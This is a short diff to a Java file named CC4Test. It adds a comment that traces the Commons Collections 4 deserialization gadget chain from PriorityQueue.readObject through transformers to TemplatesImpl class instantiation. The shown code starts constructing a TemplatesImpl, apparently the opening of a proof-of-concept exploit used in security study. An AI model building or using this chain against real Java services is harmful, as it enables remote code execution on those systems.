@@ -17,6 +17,24 @@ import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.PriorityQueue;
 
+
+/**
+ *Gadget chain:
+ * 		ObjectInputStream.readObject()
+ * 			PriorityQueue.readObject()
+ * 			    PriorityQueue.heapify()
+ * 			        PriorityQueue.siftDown()
+ * 			            PriorityQueue.siftDownUsingComparator()
+ * 					        TransformingComparator.compare()
+ * 					        	ChainedTransformer.transform()
+ *  								ConstantTransformer.transform()
+ *  								InstantiateTransformer.transform()
+ *  							       TrAXFilter.init()
+ *  									    TemplatesImpl.newTransformer()
+ *  									    	TemplatesImpl.getTransletInstance()
+ *  								                Class.newInstance()
+ **/
+
 public class CC4Test {
     public static void main(String[] args) throws Exception {
         TemplatesImpl templates = new TemplatesImpl();
